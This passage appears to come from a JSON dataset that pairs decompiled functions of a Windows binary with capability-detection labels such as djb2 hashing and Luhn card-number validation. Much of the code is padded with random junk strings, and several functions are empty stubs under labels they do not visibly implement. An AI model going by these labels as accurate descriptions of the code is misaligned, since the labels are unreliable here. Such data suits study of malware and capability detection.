     if (uVar8 == 0) {\n            puVar1 = iVar4 + 0x10 + iVar6 * 4;\n            uVar5 = 0x1f;\n            if (*puVar1 != 0) {\n                for (; *puVar1 >> uVar5 == 0; uVar5 = uVar5 - 1) {\n                }\n            }\n            *param_2 = iVar2 + -0x432;\n            *param_3 = iVar6 * 0x20 - (uVar5 ^ 0x1f);\n            return;\n        }\n        *param_2 = (uVar8 - 0x433) + iVar2;\n        *param_3 = 0x35 - iVar2;\n    }\n    return;\n}\n",
        "token_count": 749
    },
    "00446ae0": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nfloat10 fcn.00446ae0(int32_t param_1, int32_t param_2)\n\n{\n    double dVar1;\n    double dVar2;\n    float10 fVar3;\n    int32_t iStack56;\n    int32_t iStack48;\n    int32_t iStack20;\n    int32_t aiStack16 [2];\n    \n    fVar3 = fcn.004467d0(param_1, &iStack20);\n    dVar1 = fVar3;\n    iStack56 = dVar1 >> 0x20;\n    fVar3 = fcn.004467d0(param_2, aiStack16);\n    dVar2 = fVar3;\n    aiStack16[0] = ((*(param_1 + 0x10) - *(param_2 + 0x10)) * 0x20 + iStack20) - aiStack16[0];\n    if (0 < aiStack16[0]) {\n        return (dVar1 & 0xffffffff | aiStack16[0] * 0x100000 + iStack56 << 0x20) / dVar2;\n    }\n    iStack48 = dVar2 >> 0x20;\n    return dVar1 / (dVar2 & 0xffffffff | iStack48 + aiStack16[0] * -0x100000 << 0x20);\n}\n",
        "token_count": 303
    },
    "00446f90": {
        "rules": [
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5",
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b"
        ],
        "decompiled_code": "\nint32_t fcn.00446f90(int32_t param_1)\n\n{\n    return param_1 * 0x20 + _sym.imp.msvcrt.dll__iob;\n}\n",
        "token_count": 42
    },
    "004030de": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.004030de(uint param_1)\n\n{\n    uint in_stack_fffffcf8;\n    ulong uVar1;\n    char *pcVar2;\n    ulong in_stack_fffffdec;\n    uint uVar3;\n    uint var_18ch;\n    uint var_184h;\n    uint var_169h;\n    uint var_14dh;\n    uint var_131h;\n    uint var_115h;\n    uint var_fch;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_bp_24h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    uVar3 = in_stack_fffffdec >> 0x20;\n    fcn.00483110();\n    fcn.004b21e0(\"uqzeohpoqbqhhxyupflgcdeskyiksmjczuqttycccwrtohpxw\", &var_169h);\n    fcn.00483110();\n    fcn.004b21e0(\"smnnmawjhtlsyjmrhlekppuygrznnzgrulaeuudcyaruba\", &var_14dh);\n    fcn.00402b42(*0x519310, *0x519310 >> 0x20, &var_169h + 1, 0x4e9, &var_184h, *0x519308, *0x519308 >> 0x20, *0x519300\n                 , *0x519300 >> 0x20, *0x5192f8, *0x5192f8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(uVar3, &var_131h);\n    pcVar2 = \"itgindapgzothsvvnjkfydyoencriwusnwnw\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"gtbqdbjcjpyvkkg\", &var_115h, pcVar2, uVar1);\n    fcn.00402c30(&var_131h + 1, 0xad3, &var_14dh + 1, *0x519328, *0x519328 >> 0x20, *0x519320, *0x519320 >> 0x20, \n                 *0x519318, *0x519318 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00402e22(0, *0x519330, *0x519330 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"qderqwlgjsrjfqvwivyysnbnxpqjkkbmambrkbuabprgcgxxrrnkedwokjal\", &var_e1h);\n    fcn.0040301c(param_1, &var_fch, *0x519340, *0x519340 >> 0x20, 0, *0x519338, *0x519338 >> 0x20, 0x1f2f, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"smhkiruwfvqbkhxmghgbfqixu\", &var_c5h);\n    fcn.00402b1c(*0x519348, *0x519348 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"yhrndeatywnpzadxzjazdtdvilyvbusgmsqrxwhrcedvi\", &var_a9h);\n    fcn.00401cae(*0x519360, *0x519360 >> 0x20, 0x8a3, &var_c5h + 1, 0x9da, *0x519358, *0x519358 >> 0x20, *0x519350, \n                 *0x519350 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ssvfmtxcxzyiyqepgpwmegmxwcexpsdmeiakgmcosfduscieavkobxfvc\", &var_8dh);\n    fcn.00401d56(&var_a9h + 1, 0x766, 0x2f4, *0x519370, *0x519370 >> 0x20, 0x639, *0x519368, *0x519368 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x403542, in_stack_fffffcf8);\n    fcn.004b21e0(\"txonvirzjmmzqebwnepcqebqyplbtchkvbmiutcluhtjobpndtrmapwhsebsohplfyorsazyhjghqlliofsauyrypsnmckxan\", \n                 &var_59h);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"evgehbckiamlfhvunftbwzckqoocyswqzepefbg\", &var_3dh);\n    fcn.00401e0c(param_1, 0, *0x519388, *0x519388 >> 0x20, 0, *0x519380, *0x519380 >> 0x20, *0x519378, *0x519378 >> 0x20\n                 , 0x1bd, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00402072(param_1, *0x5193a8, *0x5193a8 >> 0x20, 1, 0x30c, *0x5193a0, *0x5193a0 >> 0x20, 1, *0x519398, \n                 *0x519398 >> 0x20, *0x519390, *0x519390 >> 0x20);\n    fcn.004b2800();\n    fcn.00402366(0, *0x5193b8, *0x5193b8 >> 0x20, 1, 1, 0, *0x5193b0, *0x5193b0 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"saigfgihrfesbtznnadmbspeczwdlsschmqgjrvjlbdpivtikdkrwqnh\", &var_9h);\n    fcn.004028f8(&var_bp_24h, 0, 0xa34, 0, *0x5193c0, *0x5193c0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 1789
    },
    "00404294": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl\nfcn.00404294(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_14h;\n    uint var_1h;\n    \n    return 0;\n}\n",
        "token_count": 130
    },
    "0040a80e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nfloat10 __cdecl fcn.0040a80e(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_8h;\n    uint var_1h;\n    \n    return *0x521f60;\n}\n",
        "token_count": 105
    },
    "0040d48a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0040d48a(uint param_1)\n\n{\n    char *pcVar1;\n    uint in_stack_fffffb30;\n    ulong uVar2;\n    uint *puVar3;\n    uint in_stack_fffffc54;\n    uint var_35ch;\n    uint var_354h;\n    uint var_339h;\n    uint var_31dh;\n    uint var_301h;\n    uint var_2e5h;\n    uint var_2c9h;\n    uint var_2adh;\n    uint var_294h;\n    uint var_279h;\n    uint var_25dh;\n    uint var_244h;\n    uint var_229h;\n    uint var_20dh;\n    uint var_1f1h;\n    uint var_1d5h;\n    uint var_1b9h;\n    uint var_19dh;\n    uint var_181h;\n    uint var_165h;\n    uint var_14ch;\n    uint var_134h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c5h;\n    uint var_a9h;\n    uint var_8dh;\n    uint var_74h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_bp_24h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.00483110();\n    fcn.004b21e0(\"ixaoqwwiagyjtgzgxvfaxrpjnpvygxjwahkjdgyivjovaofqyqzcqiykfpzqruazq\", &var_339h);\n    uVar2 = CONCAT44(0x40d4e6, in_stack_fffffc54);\n    fcn.0040d28a(0x66a, &var_354h);\n    fcn.004b2800(uVar2);\n    fcn.00483140();\n    fcn.0040d2a0();\n    fcn.00483110();\n    fcn.004b21e0(\"adiekzihsrftvmemcymparcenzekopqgtlcaroawvzlzwxro\", &var_31dh);\n    fcn.0040d35a(*0x5220e0, *0x5220e0 >> 0x20, *0x5220d8, *0x5220d8 >> 0x20, &var_339h + 1, 0x708, *0x5220d0, \n                 *0x5220d0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"xfzb\", &var_301h);\n    fcn.00483110();\n    fcn.004b21e0(\"linsmbmpiskbkzijyvhoikvjyu\", &var_2e5h);\n    fcn.00483110();\n    puVar3 = &var_2c9h;\n    pcVar1 = \"jyndmojkajuiovuvchsieeresvkmpyemiupyxvmhmxkzgnmngozjpwezgczgsbkqtmtgltxgllaylgpkwhdkmcr\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"amrxuxklqcwwniswbvmzvvatcwahrsisamkhlcctbgxjadkzesyxnysxurw\", &var_2adh, pcVar1, puVar3);\n    fcn.0040d418(0x6f3, &var_2c9h + 1, &var_2e5h + 1, *0x5220e8, *0x5220e8 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    puVar3 = &var_279h;\n    pcVar1 = \"snlhbwyjoilddfstzsnvcwhbxxwiveujqatmntrcmrdzhwuhqllp\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"mlundmnobwnihlnnrcjercqsqmrwmewlz\", &var_25dh, pcVar1, puVar3);\n    fcn.0040c6e6(param_1, &var_279h + 1, &var_294h, *0x522100, *0x522100 >> 0x20, 1, *0x5220f8, *0x5220f8 >> 0x20, 0x4e\n                 , *0x5220f0, *0x5220f0 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dcqsskygbjujoahkjjumtcgza\", &var_229h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0040c8a0(param_1, *0x522118, *0x522118 >> 0x20, &var_229h + 1, 1, &var_244h, *0x522110, *0x522110 >> 0x20, 0x564\n                 , *0x522108, *0x522108 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    pcVar1 = \"jcusfmughizjgsklrmkuankoyzxuglkwsnhkrmmsww\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"tjyvwhmkibcotrnxep\", &var_1d5h, pcVar1);\n    fcn.00483110();\n    fcn.004b21e0(\"xhyjrwwrmlwqquzrjwcnitvmbzttkpuvlacfniheoyaydfeoqrzyiqqp\", &var_1b9h);\n    fcn.0040c928(*0x522128, *0x522128 >> 0x20, &var_1d5h + 1, &var_1f1h + 1, &var_20dh + 1, *0x522120, *0x522120 >> 0x20\n                );\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040ca46(*0x522130, *0x522130 >> 0x20);\n    fcn.0040cd70();\n    fcn.00483110();\n    uVar2 = CONCAT44(0x40da64, in_stack_fffffb30);\n    fcn.004b21e0(\"oehkhabbofxslumggvfcyzrqyslhduqtcubfwwpkxtiuylrhzomdbowyym\", &var_19dh);\n    fcn.00483110(uVar2);\n    fcn.004b21e0(\"rrhbypjitrn\", &var_181h);\n    fcn.0040cdbc(0x10d6, &var_19dh + 1, *0x522140, *0x522140 >> 0x20, *0x522138, *0x522138 >> 0x20, 0x2d7, 0, \n                 &var_1b9h + 1, 0, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"wdqumbufsbvgaiyiyipyhzixeyfjuqyjdgjezdtzlvdallejshpnkkxufjsbwjucotinckt\", &var_165h);\n    fcn.0040ce20(&var_181h + 1, 0xa84, 0, 1, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040d1ba();\n    fcn.004b2800();\n    fcn.0040c0e8(1, *0x522150, *0x522150 >> 0x20, *0x522148, *0x522148 >> 0x20, 0);\n    fcn.00483110();\n    fcn.004b21e0(\"atziishfaek\", &var_119h);\n    fcn.00483110();\n    fcn.004b21e0(\"njlsbevvchlopuztzalxqvejepnsbmpoznpgigboszgsxkttcafygkmeneujtrxfrihucbypchuxynheuah\", &var_fdh);\n    fcn.00483110();\n    pcVar1 = \"tmkfbxgxa\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"lamihcawkdypeusyltewlvxsckzpljgrodsjcwxpkbctcgflhpbgrmkbjprkpckubyguyuysgikbogpgarirrvfykk\", &var_c5h\n                 , pcVar1);\n    fcn.0040c2c6(param_1, 1, &var_e1h + 1, *0x522158, *0x522158 >> 0x20, &var_fdh + 1, &var_119h + 1, 1);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.0040c378(*0x522160, *0x522160 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"zovrlzaqspuigepdqhcjyygitadrxgvyha\", &var_a9h);\n    fcn.00483110();\n    fcn.004b21e0(\"dkbcrwxhdepbxrayw\", &var_8dh);\n    fcn.0040c3b8(0x8b4, 0, 1, 0, &var_a9h + 1, 0x1bc, &var_c5h + 1, *0x522168, *0x522168 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"uekzejdqbxwlixluupwhjepodchsz\", &var_59h);\n    fcn.00483110();\n    fcn.004b21e0(\"eyifehilmz\", &var_3dh);\n    fcn.0040c4a0(param_1, 0, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"ozhdnwvkulsrdmsyrkedmucjfferjpjkntqfthbzqgeqddawzkngtojmacekhermzzadssjpipaksjdczcm\", &var_9h);\n    fcn.0040c54e(param_1, &var_bp_24h);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    return;\n}\n",
        "token_count": 2938
    },
    "0041284a": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0041284a(uint param_1)\n\n{\n    uint in_stack_fffffcd0;\n    ulong uVar1;\n    uint var_26ch;\n    uint var_264h;\n    uint var_24ch;\n    uint var_231h;\n    uint var_215h;\n    uint var_1f9h;\n    uint var_1ddh;\n    uint var_1c1h;\n    uint var_1a5h;\n    uint var_189h;\n    uint var_16dh;\n    uint var_151h;\n    uint var_135h;\n    uint var_119h;\n    uint var_fdh;\n    uint var_e1h;\n    uint var_c8h;\n    uint var_adh;\n    uint var_91h;\n    uint var_75h;\n    uint var_59h;\n    uint var_3dh;\n    uint var_21h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.0041231e(param_1, *0x5224b8, *0x5224b8 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041238e(1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"oghnaipqcgqzpboauzgbmgarhygyrhgtp\", &var_215h);\n    fcn.00483110();\n    fcn.004b21e0(\"hjkneiihgoeivwrzrcn\", &var_1f9h);\n    fcn.0041260c(*0x5224d0, *0x5224d0 >> 0x20, 1, &var_215h + 1, &var_231h + 1, 1, *0x5224c8, *0x5224c8 >> 0x20, \n                 *0x5224c0, *0x5224c0 >> 0x20, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00412660();\n    fcn.00483110();\n    uVar1 = CONCAT44(0x412a5c, in_stack_fffffcd0);\n    fcn.004b21e0(\"enyiplqwduot\", &var_1ddh);\n    fcn.00483110(uVar1);\n    fcn.004b21e0(\"imikeyhojycuaafigtrqmsvocfskayzashvdoqmnpmrpxmelbuijrfbodoyalafzmrurvykbekwmhzpi\", &var_1c1h);\n    fcn.004126cc(*0x5224e8, *0x5224e8 >> 0x20, *0x5224e0, *0x5224e0 >> 0x20, 1, *0x5224d8, *0x5224d8 >> 0x20, \n                 &var_1ddh + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"dmumxgpxozhzzazpjoquxazlveeyqhypvpcmdsxerkcyaxsmfyddfdslklxecta\", &var_1a5h);\n    fcn.00483110();\n    fcn.004b21e0(\"budiifamjp\", &var_189h);\n    fcn.004127aa(*0x5224f8, *0x5224f8 >> 0x20, 0x1b2a, &var_1a5h + 1, 0, &var_1c1h + 1, *0x5224f0, *0x5224f0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"yljlcskmsvzykajkxzoihtfsmvtvckizordkodjjfvxfsgqjmuxtqcxhokcehfiqstfzyxetgtjtqqjmyutgssjutdnmsyftlry\", \n                 &var_16dh);\n    fcn.00411a12(0, 0x292, &var_189h + 1, 0x1840, 0x16b2, *0x522510, *0x522510 >> 0x20, 0, 0x1587, *0x522508, \n                 *0x522508 >> 0x20, *0x522500, *0x522500 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00411a9a(0x899, *0x522520, *0x522520 >> 0x20, *0x522518, *0x522518 >> 0x20, 1);\n    fcn.00483110();\n    fcn.004b21e0(\"prydvbdwxlr\", &var_151h);\n    fcn.00483110();\n    fcn.004b21e0(\"lvytasevdyzvnnaundknjouaibiyrkvrhcqebrn\", &var_135h);\n    fcn.00483110();\n    fcn.004b21e0(\"umsdqxoocniazytameouzzyykqhfumgwohzkydcmbpvb\", &var_119h);\n    fcn.00411db6(*0x522528, *0x522528 >> 0x20, 0, &var_135h + 1, 0, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"chkmbrhanmnacufuenvakqdrjtewstywlbuwfdheokzu\", &var_fdh);\n    fcn.00483110();\n    fcn.004b21e0(\"jwhfwbqbcgqyefxpzscolofkdwaof\", &var_e1h);\n    fcn.00411e18(1, 0, *0x522540, *0x522540 >> 0x20, *0x522538, *0x522538 >> 0x20, *0x522530, *0x522530 >> 0x20, \n                 &var_fdh + 1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"sjpwbkl\", &var_adh);\n    fcn.00411eec(param_1, *0x522548, *0x522548 >> 0x20);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"etjqerkszqrndprdvnznhpugejgzotsrwdlrbqdfanybetbyzggmillfdknklflmzvor\", &var_91h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041200c(&var_91h + 1, *0x522558, *0x522558 >> 0x20, 1, &var_adh + 1, 1, 0x1935, 0, *0x522550, *0x522550 >> 0x20\n                );\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004120e6(0, *0x522560, *0x522560 >> 0x20);\n    fcn.00483110();\n    fcn.004b21e0(\"lfqpxsuwjjtxtrvqhdthufppxzxtsipbukzjzkwqmwm\", &var_59h);\n    fcn.00483110();\n    fcn.004b21e0(\"hkwsvhyrdcoigdbgxywivbhadpdgvquwcamhgimcqvpxklngbqch\", &var_3dh);\n    fcn.00412282(&var_59h + 1, 0x185, 0, &var_75h + 1, *0x522568, *0x522568 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"fkdioogcqbzskrfkwlsmzojhpzmbydqtguvbihasykdejlwzbumbegptponmwgwusutbxmdyakzsemgjzhsvdtprmjjjfi\", \n                 &var_21h);\n    fcn.00411612(*0x522578, *0x522578 >> 0x20, *0x522570, *0x522570 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004116ba();\n    fcn.00411996(param_1, 0, 1);\n    fcn.004b2800();\n    return;\n}\n",
        "token_count": 2347
    },
    "0041349e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041349e(uint arg_8h, uint arg_ch, uint noname_2, uint arg_14h, uint noname_4, uint arg_1ch, uint arg_20h, \n            uint noname_7, uint arg_28h, uint arg_2ch, uint noname_10, uint arg_34h, uint arg_38h, uint arg_3ch)\n\n{\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    return 0;\n}\n",
        "token_count": 178
    },
    "0042083e": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_4h\n\nvoid __fastcall fcn.0042083e(uint param_1)\n\n{\n    uint in_stack_fffff780;\n    ulong uVar1;\n    char *pcVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint in_stack_fffff88c;\n    uint in_stack_fffff8b8;\n    uint var_4ech;\n    uint var_4e0h;\n    uint var_4c5h;\n    uint var_4a9h;\n    uint var_48dh;\n    uint var_471h;\n    uint var_455h;\n    uint var_439h;\n    uint var_41dh;\n    uint var_404h;\n    uint var_3e9h;\n    uint var_3cdh;\n    uint var_3b1h;\n    uint var_395h;\n    uint var_379h;\n    uint var_35dh;\n    uint var_341h;\n    uint var_325h;\n    uint var_309h;\n    uint var_2edh;\n    uint var_2d1h;\n    uint var_2b5h;\n    uint var_299h;\n    uint var_27dh;\n    uint var_261h;\n    uint var_245h;\n    uint var_22ch;\n    uint var_211h;\n    uint var_1f5h;\n    uint var_1dch;\n    uint var_1c1h;\n    uint var_1a5h;\n    uint var_189h;\n    uint var_16dh;\n    uint var_151h;\n    uint var_135h;\n    uint var_11ch;\n    uint var_101h;\n    uint var_e5h;\n    uint var_c9h;\n    uint var_adh;\n    uint var_94h;\n    uint var_79h;\n    uint var_5dh;\n    uint var_41h;\n    uint var_25h;\n    uint var_9h;\n    uint var_bp_4h;\n    \n    fcn.004b2440();\n    fcn.004b2440();\n    fcn.00483110();\n    fcn.004b21e0(\"tbbrwyvcrbfhngfeyryroyvbrucsscfgbkzatidubxgajcjgtiajvrahnbclxtpsojbhzofoygooyolxjs\", \n                 &fcn.0042083e::var_4c5h);\n    fcn.00483110();\n    puVar3 = &fcn.0042083e::var_4a9h;\n    pcVar2 = \"okpfdnnzwtgahokxhjujtcgwuyhftbxdmcmscaefujpsxawzxszmpxhbe\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"yzfpbcljyiamoeaqgdcseiejicjvmuwqwgboivaezseegxjhmnuxwjjmtnswxofblkvbvwbrcyrmktvbofpzxmyyxmfhrpwactal\"\n                 , &fcn.0042083e::var_48dh, pcVar2, puVar3);\n    fcn.00483110();\n    fcn.004b21e0(\"uvkrsfrhxywzqlddlxaaumabqcxtjjdfuofmgcqswpukloojxubcxywuzspagjcnctv\", &fcn.0042083e::var_471h);\n    fcn.0041fcd4(&fcn.0042083e::var_48dh + 1, &fcn.0042083e::var_4a9h + 1, &fcn.0042083e::var_4c5h + 1, 1, 0, *0x522ea0\n                 , *0x522ea0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"hzwtdybhvzggfsvicoaweqdzjsqcrdpitwryksvbbtfvorimtgdztllqihhudhgywzt\", &fcn.0042083e::var_455h);\n    fcn.0041fcfa(*0x522ea8, *0x522ea8 >> 0x20, 0x3ba, 0xc3b, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"gltauatgrep\", &fcn.0042083e::var_439h);\n    fcn.0041fea2(1, 2, &fcn.0042083e::var_455h + 1, *0x522eb8, *0x522eb8 >> 0x20, 0xa85, *0x522eb0, *0x522eb0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(0x51ec28, &fcn.0042083e::var_41dh);\n    fcn.0042019a(1, 1);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0042023c(param_1, *0x522ec0, *0x522ec0 >> 0x20, &fcn.0042083e::var_404h, 0);\n    fcn.004b2800();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004206b4();\n    fcn.00483110();\n    fcn.004b21e0(\"awovpzvkvjaxpaxnailucsd\", &fcn.0042083e::var_3cdh);\n    fcn.00483110();\n    fcn.004b21e0(\"wyonormztxvzmqgpjztefmuiisnsqhdnhaumlnjtbzxntimufqdcooabd\", &fcn.0042083e::var_3b1h);\n    fcn.00483110();\n    puVar3 = &fcn.0042083e::var_395h;\n    pcVar2 = \"ccxqcvnjzwvshylvhmpmhztbofuvnpxkwboqdqfeaacqfxtgjpetsrzkvkdgzzbcrbviuwvckmkbvmexbcdbtw\";\n    fcn.004b21e0();\n    fcn.00483110();\n    fcn.004b21e0(\"tnsnmyrsypvecterakcgnxzxulhgpihixokscetceyjptjglboymtsrnrcxsrcrrbdyupbfwtmahpuitecnuqdfyhmgtdutqgtm\", \n                 &fcn.0042083e::var_379h, pcVar2, puVar3);\n    fcn.00420810(&fcn.0042083e::var_395h + 1, &fcn.0042083e::var_3b1h + 1, 0, *0x522ec8, *0x522ec8 >> 0x20, 0);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.00483110();\n    fcn.004b21e0(\"pskhjdusuthblvldfunjxrnxo\", &fcn.0042083e::var_35dh);\n    fcn.00483110();\n    fcn.004b21e0(\"jcvastkllfqbfvdznietgdvhewjffhzrqdnyddwqynvzsefms\", &fcn.0042083e::var_341h);\n    fcn.00483110();\n    fcn.004b21e0(\"ulzekhvbwhrnaqtszkschwqusadzdhymncyrwismnzlcysprrzafyqsfzyrl\", &fcn.0042083e::var_325h);\n    fcn.00483110();\n    fcn.004b21e0();\n    fcn.0041ebce(&fcn.0042083e::var_325h + 1, *0x522ed8, *0x522ed8 >> 0x20, &fcn.0042083e::var_341h + 1, 0, \n                 &fcn.0042083e::var_35dh + 1, &fcn.0042083e::var_379h + 1, 0xeed, *0x522ed0, *0x522ed0 >> 0x20);\n    fcn.004b2800();\n    fcn.00483140();\n    fcn.004b2800();\n    fcn.00483140();\n    